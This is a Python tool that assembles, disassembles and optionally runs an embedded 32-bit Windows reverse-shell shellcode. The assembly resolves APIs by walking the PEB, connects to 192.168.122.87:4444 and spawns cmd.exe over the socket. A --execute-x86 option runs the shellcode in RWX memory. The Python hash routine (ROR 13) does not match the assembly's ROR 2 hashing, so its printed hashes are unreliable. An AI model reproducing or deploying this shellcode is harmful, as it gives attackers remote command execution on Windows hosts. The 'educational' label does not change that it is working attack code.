#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import ctypes
import sys
import argparse
import keystone as ks
import capstone as cs
import os

# ==============================================================================
# Windows Console Colors using ctypes
# ==============================================================================

# Standard handle IDs
STD_OUTPUT_HANDLE = -11

# Color constants for the console
FOREGROUND_BLUE = 0x0001
FOREGROUND_GREEN = 0x0002
FOREGROUND_RED = 0x0004
FOREGROUND_CYAN = FOREGROUND_BLUE | FOREGROUND_GREEN
FOREGROUND_YELLOW = FOREGROUND_RED | FOREGROUND_GREEN # Orange/Brown, used for dark yellow
FOREGROUND_INTENSITY = 0x0008  # For brighter colors

# Combined colors
FOREGROUND_LIGHT_GREEN = FOREGROUND_GREEN | FOREGROUND_INTENSITY
FOREGROUND_LIGHT_RED = FOREGROUND_RED | FOREGROUND_INTENSITY
FOREGROUND_LIGHT_CYAN = FOREGROUND_CYAN | FOREGROUND_INTENSITY
FOREGROUND_LIGHT_YELLOW = FOREGROUND_YELLOW | FOREGROUND_INTENSITY
FOREGROUND_WHITE = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED

# Get handle to the standard output, handling non-Windows environments
try:
    if os.name == 'nt':
        std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
    else:
        class DummyHandle:
            def SetConsoleTextAttribute(self, *args): pass
        std_out_handle = DummyHandle()
except (AttributeError, NameError):
    class DummyHandle:
        def SetConsoleTextAttribute(self, *args): pass
    std_out_handle = DummyHandle()


def set_color(color):
    """Sets the console text color (Windows only)."""
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTextAttribute(std_out_handle, color)

def reset_color():
    """Resets the console text color to default white (Windows only)."""
    if os.name == 'nt':
        set_color(FOREGROUND_WHITE)

def print_banner():
    """Prints the custom ASCII art banner."""
    os.system('cls' if os.name == 'nt' else 'clear') # Clear the screen first
    set_color(FOREGROUND_LIGHT_CYAN)
    banner = r"""
 ___  __    ___  __    ________  ___  ___  _______   ___       ___       ________  ________  ________  _______      
|\  \|\  \ |\  \|\  \ |\   ____\|\  \|\  \|\  ___ \ |\  \     |\  \     |\   ____\|\   __  \|\   ___ \|\  ___ \     
\ \  \/  /|\ \  \/  /|\ \  \___|\ \  \\\  \ \   __/|\ \  \    \ \  \    \ \  \___|\ \  \|\  \ \  \_|\ \ \   __/|    
 \ \   ___  \ \   ___  \ \_____  \ \   __  \ \  \_|/_\ \  \    \ \  \    \ \  \    \ \  \\\  \ \  \ \\ \ \  \_|/__  
  \ \  \\ \  \ \  \\ \  \|____|\  \ \  \ \  \ \  \_|\ \ \  \____\ \  \____\ \  \____\ \  \\\  \ \  \_\\ \ \  \_|\ \ 
   \ \__\\ \__\ \__\\ \__\____\_\  \ \__\ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \_______\ \_______\
    \|__| \|__|\|__| \|__|\_________\|__|\|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|_______|\|_______|
                         \|_________|                                                                               
                                                                                                                    
                                                                                                                    
    """
    print(banner)
    set_color(FOREGROUND_YELLOW) # Dark Yellow
    print("                                      @oaugustopro")
    print("\n")
    reset_color()


# ==============================================================================
# SHELLCODE VERSIONS SAMPLES
# ==============================================================================
CODE_V1 = r"""
; --- DYNAMIC REVERSE SHELL - FOR EDUCATIONAL PURPOSES ---
; This shellcode dynamically finds and calls Windows API functions.
start:
    ; --- Setup Stack Frame and Resolver ---
    mov     ebp, esp
    add     esp, 0xfffff9f0         ; Allocate space on the stack safely
    jmp     get_resolver_ptr_forward ; Jump to setup the function resolver

get_resolver_ptr_backward:
    pop     esi                     ; ESI now holds the address of the resolver
    mov     dword ptr [ebp + 4], esi ; Save the resolver's address
    jmp     load_libraries          ; Jump to the main logic

get_resolver_ptr_forward:
    call    get_resolver_ptr_backward ; Get the address of the resolver routine

; --- API Function Resolver ---
; Finds the address of a function in a loaded DLL using its hash.
api_resolver:
    pushad                          ; Save all registers
    xor     ecx, ecx                ; Zero ECX
    mov     esi, dword ptr fs:[ecx + 0x30] ; ESI -> PEB
    mov     esi, dword ptr [esi + 0xc]   ; ESI -> PEB->Ldr
    mov     esi, dword ptr [esi + 0x1c]   ; ESI -> InLoadOrderModuleList
    push    esi                     ; Save the start of the module list

find_next_module:
    inc     esi                     ; (Instruction part of a larger sequence)
    mov     ebx, dword ptr [esi + 7]     ; EBX = Module Base Address
    dec     esi                     ; (Instruction part of a larger sequence)
    movzx   eax, byte ptr [esi + 0x1e] ; EAX = (Instruction part of a larger sequence)
    mov     dword ptr [ebp - 8], eax ; (Instruction part of a larger sequence)
    mov     eax, dword ptr [ebx + 0x3c]  ; EAX -> PE Header
    mov     edi, dword ptr [ebx + eax + 0x78] ; EDI -> Export Table RVA
    add     edi, ebx                ; EDI -> Export Table VMA
    mov     ecx, dword ptr [edi + 0x18]  ; ECX = Number of function names
    mov     eax, dword ptr [edi + 0x20]  ; EAX -> Name Pointer Table RVA
    add     eax, ebx                ; EAX -> Name Pointer Table VMA
    mov     dword ptr [ebp - 4], eax ; Save Name Pointer Table address

check_function_name:
    jecxz   module_not_found        ; If no more functions, check next module
    dec     ecx                     ; Decrement function counter
    mov     eax, dword ptr [ebp - 4] ; Restore Name Pointer Table
    mov     esi, dword ptr [eax + ecx*4] ; ESI -> Function Name RVA
    add     esi, ebx                ; ESI -> Function Name VMA
    xor     eax, eax                ; Zero EAX for hashing
    mov     edx, dword ptr [ebp - 8] ; Restore hash key
    cld                             ; Clear direction flag

hash_char:
    lodsb                           ; Load byte from ESI into AL
    test    al, al                  ; Check for null terminator
    je      compare_hashes          ; If null, hash is complete
    ror     edx, 2                  ; Rotate hash right by 2
    add     edx, eax                ; Add character to hash
    jmp     hash_char               ; Loop to next character

compare_hashes:
    jmp     check_hash_match        ; (This jump is part of the original logic flow)

module_not_found:
    pop     esi                     ; Restore module list pointer
    mov     esi, dword ptr [esi]    ; Go to the next module
    jmp     find_next_module        ; Loop to check the new module

check_hash_match:
    cmp     edx, dword ptr [esp + 0x28] ; Compare computed hash with target hash
    jne     check_function_name     ; If not a match, continue searching

    ; --- If Hash Matches, Get Function Address ---
    mov     edx, dword ptr [edi + 0x24]  ; EDX -> Ordinal Table RVA
    add     edx, ebx                ; EDX -> Ordinal Table VMA
    mov     cx, word ptr [edx + ecx*2]   ; CX = Function Ordinal
    mov     edx, dword ptr [edi + 0x1c]  ; EDX -> Address Table RVA
    add     edx, ebx                ; EDX -> Address Table VMA
    mov     eax, dword ptr [edx + ecx*4] ; EAX -> Function RVA
    add     eax, ebx                ; EAX -> Function VMA (Address)
    mov     dword ptr [esp + 0x20], eax  ; Overwrite saved EAX with the function address

    pop     esi                     ; (Restore from PUSHAD)
    popal                           ; Restore all registers
    pop     ecx                     ; (Cleanup stack)
    pop     edx                     ; (Cleanup stack)
    push    ecx                     ; (Restore stack)
    jmp     eax                     ; Jump to the resolved API function

; --- Main Logic: Load Libraries and Functions ---
load_libraries:
    ; Load ws2_32.dll
    mov     eax, 0xfeffb3b4         ; Encoded string for "ws2_32.dll"
    neg     eax
    push    eax
    push    0x442e3233              ; "32.D"
    push    0x5f325357              ; "WS2_"
    push    esp                     ; Pointer to string
    push    0x76c47a68              ; Hash for LoadLibraryA
    call    dword ptr [ebp + 4]     ; Call the resolver

    ; --- Setup Network Connection ---
    ; WSAStartup
    mov     eax, esp                ; Setup stack for WSAData
    xor     ecx, ecx
    mov     cx, 0x590
    sub     eax, ecx
    push    eax
    xor     eax, eax
    mov     ax, 0x202               ; Version 2.2
    push    eax
    push    0xcc9e2096              ; Hash for WSAStartup
    call    dword ptr [ebp + 4]

    ; WSASocketA
    xor     eax, eax
    push    eax
    push    eax
    push    eax
    mov     al, 6
    push    eax
    sub     al, 5                   ; Type = 1 (SOCK_STREAM)
    push    eax
    inc     eax                     ; Family = 2 (AF_INET)
    push    eax
    push    0x815e2066              ; Hash for WSASocketA
    call    dword ptr [ebp + 4]

    ; WSAConnect
    mov     esi, eax                ; Save socket descriptor in ESI
    xor     eax, eax
    push    eax
    push    eax
    push    0x577aa8c0              ; IP: 192.168.122.87 (reversed)
    mov     ax, 0x5c11              ; Port: 4444 (reversed)
    shl     eax, 0x10
    add     ax, 2                   ; Family: AF_INET
    push    eax
    push    esp
    pop     edi
    xor     eax, eax
    push    eax
    push    eax
    push    eax
    push    eax
    add     al, 0x10                ; Length = 16
    push    eax
    push    edi
    push    esi
    push    0x575e2095              ; Hash for WSAConnect
    call    dword ptr [ebp + 4]

    ; --- Create Process (cmd.exe) ---
    ; Setup STARTUPINFO structure
    push    esi                     ; hStdError = socket
    push    esi                     ; hStdOutput = socket
    push    esi                     ; hStdInput = socket
    xor     eax, eax
    lea     ecx, [eax + 0xd]        ; Setup loop counter
    push    eax
loop_setup_startupinfo:
    loop    loop_setup_startupinfo  ; Push 13 null dwords
    mov     al, 0x44
    push    eax
    push    esp
    pop     edi
    mov     word ptr [edi + 0x2c], 0x101 ; Set dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW

    ; Create cmd.exe string
    mov     eax, 0xff9a879b          ; "exe"
    neg     eax
    push    eax
    mov     eax, 0xd19b929d          ; ".dmc" -> "cmd."
    neg     eax
    push    eax
    mov     ebx, esp

    ; Setup PROCESS_INFORMATION structure
    mov     eax, esp
    xor     ecx, ecx
    mov     cx, 0x390
    sub     eax, ecx
    push    eax                     ; lpProcessInformation
    push    edi                     ; lpStartupInfo
    xor     eax, eax
    push    eax
    push    eax
    push    eax
    inc     eax                     ; bInheritHandles = TRUE
    push    eax
    dec     eax
    push    eax
    push    eax
    push    ebx                     ; lpCommandLine = "cmd.exe"
    push    eax
    push    0xbaa28c7               ; Hash for CreateProcessA
    call    dword ptr [ebp + 4]

    ; ExitProcess
    xor     ecx, ecx
    push    ecx
    push    -1
    push    0x2ea955d2              ; Hash for ExitProcess
    call    dword ptr [ebp + 4]
"""
CODE_V2 = r"""
start
    push    ecx
"""

SHELLCODE_VERSIONS = {
    "v1": CODE_V1,
    "v2": CODE_V2,
}

def ror(d, n):
    """Simulates the 32-bit ROR instruction in Python."""
    return ((d >> n) | (d << (32 - n))) & 0xFFFFFFFF

def calculate_hash(api_name):
    """Calculates the hash of a string using the ROR 13 algorithm."""
    edx = 0
    for char in api_name:
        eax = ord(char)
        edx = ror(edx, 13)
        edx = (edx + eax) & 0xFFFFFFFF
    return edx


def parse_badchars_string(badchars_str):
    """Parses a string of bad characters (e.g., '\\x00\\x0a') into a set of integers."""
    if not badchars_str:
        return set()
    try:
        bad_list = [int(b, 16) for b in badchars_str.split('\\x') if b]
        return set(bad_list)
    except (ValueError, IndexError):
        set_color(FOREGROUND_LIGHT_RED)
        print(f"[-] Error: Invalid badchars format: \"{badchars_str}\".")
        print("    Example format: --badchars \"\\x00\\x0a\\x0d\"")
        reset_color()
        sys.exit(1)

def print_execution_summary(version, count, shellcode_len, badchars_str):
    """Prints the summary block specifically for the execution phase."""
    print("\n" + "-" * 50)
    print(f"[*] Assembling shellcode version: {version}")
    print(f"[*] Encoded {count} instructions...")
    set_color(FOREGROUND_LIGHT_YELLOW)
    print(f"[+] Shellcode Size: {shellcode_len} bytes (0x{shellcode_len:x})")
    reset_color()
    if badchars_str:
        print(f"[*] Checking against badchars: {badchars_str}")
    print("-" * 50)


def execute_shellcode(shellcode, version, count, badchars_str):
    """Allocates executable memory and runs the provided shellcode."""
    print("\n[!!] ATTEMPTING TO EXECUTE SHELLCODE [!!]")
    print_execution_summary(version, count, len(shellcode), badchars_str)
    if sys.platform != 'win32':
        print("[-] Execution is only supported on Windows.")
        return
    try:
        kernel32 = ctypes.windll.kernel32
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE = 0x1000, 0x2000, 0x40
        ptr = kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not ptr: raise ctypes.WinError()
        print(f"[*] Memory allocated at: {hex(ptr)}")
        ctypes.memmove(ptr, shellcode, len(shellcode))
        print(f"[*] {len(shellcode)} bytes copied to memory.")
        ShellcodeFunc = ctypes.CFUNCTYPE(None)
        func_ptr = ShellcodeFunc(ptr)
        print("[*] Executing shellcode...")
        func_ptr()
        print("[+] Shellcode execution finished (or is running in the background).")
    except Exception as e:
        set_color(FOREGROUND_LIGHT_RED)
        print(f"[-] An error occurred during execution: {e}")
        reset_color()

def main():
    """Main function to parse arguments and drive the script."""
    parser = argparse.ArgumentParser(
        description="Assemble, analyze, and optionally execute x86 shellcode.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-v', '--version', choices=SHELLCODE_VERSIONS.keys(), default='v1', help='Select the shellcode version to assemble (default: v1).')
    parser.add_argument('--badchars', type=str, help='String of bad characters to check for, e.g., "\\x00\\x0a\\x80"')
    parser.add_argument('--execute-x86', action='store_true', help='Execute the generated x86 shellcode (Windows only).')
    args = parser.parse_args()

    # --- Print the new banner at the start ---
    print_banner()

    CODE = SHELLCODE_VERSIONS[args.version]
    assemble_lines, meta = [], []
    for raw in CODE.splitlines():
        line = raw.strip()
        if not line: continue
        asm_part, comment = (line.split(';', 1) + [""])[:2]
        asm_part = asm_part.rstrip()
        if not asm_part: continue
        is_label = asm_part.strip().endswith(':')
        assemble_lines.append(asm_part)
        meta.append({"is_label": is_label, "comment": comment.strip()})
    
    code_no_comments = "\n".join(assemble_lines)

    try:
        engine = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
        encoding, count = engine.asm(code_no_comments)
        shellcode = bytes(encoding)
    except ks.KsError as e:
        set_color(FOREGROUND_LIGHT_RED)
        print(f"[-] Keystone Error: {e}")
        reset_color()
        return

    bad_chars_set = parse_badchars_string(args.badchars)
    badchars_str_formatted = ' '.join(f'\\x{b:02x}' for b in sorted(list(bad_chars_set))) if bad_chars_set else ""

    md = cs.Cs(cs.CS_ARCH_X86, cs.CS_MODE_32)
    md.detail = False
    set_color(FOREGROUND_LIGHT_GREEN)
    print("[Listing: OPCODES | INSTRUCTION | COMMENT]\n")
    reset_color()

    OPC_LEN, INSN_LEN = 28, 35
    opcodes_all = []
    insn_iter = md.disasm(shellcode, 0x1000)
    current_insn = next(insn_iter, None)

    for i, entry in enumerate(meta):
        if entry["is_label"]:
            label_text = assemble_lines[i].strip()
            set_color(FOREGROUND_LIGHT_GREEN)
            print(f"{'':{OPC_LEN}} | {label_text}")
            reset_color()
            continue
        if current_insn is None: break
        bstr = " ".join(f"{b:02x}" for b in current_insn.bytes)
        opcodes_all.extend(f"{b:02x}" for b in current_insn.bytes)
        insn_text = f"{current_insn.mnemonic} {current_insn.op_str}".rstrip()
        comment = entry["comment"]
        badchar_warning = ""
        if bad_chars_set:
            found_bad_in_line = [b for b in current_insn.bytes if b in bad_chars_set]
            if found_bad_in_line:
                found_bad_str = ' '.join(f'\\x{b:02x}' for b in found_bad_in_line)
                badchar_warning = f"[BADCHARS: {found_bad_str}]"
        if badchar_warning:
            set_color(FOREGROUND_LIGHT_RED)
            print(f"{bstr:<{OPC_LEN}} | {insn_text:<{INSN_LEN}} | {comment:<40} {badchar_warning}")
        else:
            reset_color()
            print(f"{bstr:<{OPC_LEN}} | {insn_text:<{INSN_LEN}} | {comment:<40}")
        current_insn = next(insn_iter, None)

    print("\n" + "-"*80)
    print("[ALL OPCODES - C string format]")
    print("".join(f"\\x{b}" for b in opcodes_all))
    
    if bad_chars_set:
        present_bad_overall = set(b for b in shellcode if b in bad_chars_set)
        if present_bad_overall:
            set_color(FOREGROUND_LIGHT_RED)
            print("\n[ATTENTION] Shellcode contains forbidden badchars!")
            print(" -> Badchars present:", " ".join(f"\\x{b:02x}" for b in sorted(list(present_bad_overall))))
        else:
            set_color(FOREGROUND_LIGHT_GREEN)
            print("\n[OK] Shellcode is free of all specified badchars.")
    reset_color()
    print("-" * 80)

    with open("shellcode.bin", "wb") as f: f.write(shellcode)
    with open("shellcode_hex.txt", "w") as f: f.write(" ".join(opcodes_all) + "\n")
    print("\n[*] Shellcode saved to shellcode.bin and shellcode_hex.txt")

    api_names = ["TerminateProcess", "LoadLibraryA", "WinExec", "VirtualProtect", "WriteProcessMemory", "GetUserNameA", "NtSetInformationProcess", "SetProcessDEPPolicy", "CopyFileExA", "CreateProcessA"]
    print("\n--- API Hashes (ROR 13) ---")
    for name in api_names:
        h = calculate_hash(name)
        print(f'Hash for "{name}": {hex(h)}')

    if args.execute_x86:
        execute_shellcode(shellcode, args.version, count, badchars_str_formatted)
        set_color(FOREGROUND_LIGHT_GREEN)
        print("\n[STATUS] Shellcode execution was attempted.")
    else:
        set_color(FOREGROUND_YELLOW) # Dark Yellow / Orange
        print("\n[STATUS] Shellcode was not executed (use --execute-x86 flag to run).")
    
    reset_color()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Script execution interrupted by user.")
    finally:
        reset_color()
